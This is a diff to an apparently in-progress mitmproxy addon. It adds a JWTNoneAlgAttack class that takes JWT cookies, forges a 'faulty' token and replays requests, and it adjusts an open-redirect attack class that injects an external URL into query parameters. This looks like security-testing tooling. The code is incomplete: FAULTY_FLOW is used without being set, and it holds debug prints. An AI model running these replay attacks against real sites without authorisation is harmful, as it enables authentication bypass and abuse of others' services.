@@ -1,5 +1,7 @@
+import base64
+import json
 from mitmproxy import http
-from helpers import replay_flow
+from helpers import *
 from constants import URL_REGEX_STRING, PATH_REGEX_STRING
 import re, requests, tldextract
 
@@ -21,6 +23,50 @@ class RequestLogger:
     def request(self, flow: http.HTTPFlow):
         print(flow.request)
 
+class JWTNoneAlgAttack:
+    ATTACK_LABEL = 'JWT_NONE_ALG'
+    FAULTY_LABEL = 'FAULTY_JWT_TOKEN'
+
+    # looks for JWT tokens in the request and logs them
+    def request(self, flow: http.HTTPFlow):
+        if hasattr(flow.request, 'ignore'):
+            return
+        
+        
+        print(f'path: {flow.request.path}\npath components: {flow.request.path_components}')
+        print('path home')
+
+        auth_token = get_jwt(flow.request.cookies)
+        if auth_token is None:
+            return # No JWT token
+        
+        print(f'Request {flow.request}\n<->\nResponse {flow.response}')
+
+        if self.FAULTY_FLOW is None:
+            faulty_token = generate_faulty_token(auth_token)
+            faulty_request = flow.copy()
+            faulty_request.request.cookies['token'] = faulty_token
+            faulty_request.request.label = self.FAULTY_LABEL
+            faulty_request.request.ignore = True
+            replay_flow(faulty_request)
+        
+        print('-=' * 20)
+
+        # while self.FAULTY_FLOW is None:
+        #     pass
+
+
+
+        return
+    
+    def response(self, flow: http.HTTPFlow):
+        if flow.request.label == self.FAULTY_LABEL:
+            print('[]' * 20)
+            self.FAULTY_FLOW = flow
+            print(self.FAULTY_FLOW.response.text)
+            print(self.FAULTY_FLOW.response.status_code)
+            print('[]' * 20)
+        
 
 class OpenRedirectionAttack:
     REF_ATTACK_URL = 'http://google.com'
@@ -50,7 +96,7 @@ class OpenRedirectionAttack:
             attack_flow.request.query[param_name] = self.REF_ATTACK_URL
             attack_flow.request.ignore = True
             # print(attack_flow.request.query)
-            replay_flow(attack_flow, self.ATTACK_LABEL)
+            replay_flow(attack_flow)
     
 
     def response(self, flow: http.HTTPFlow):
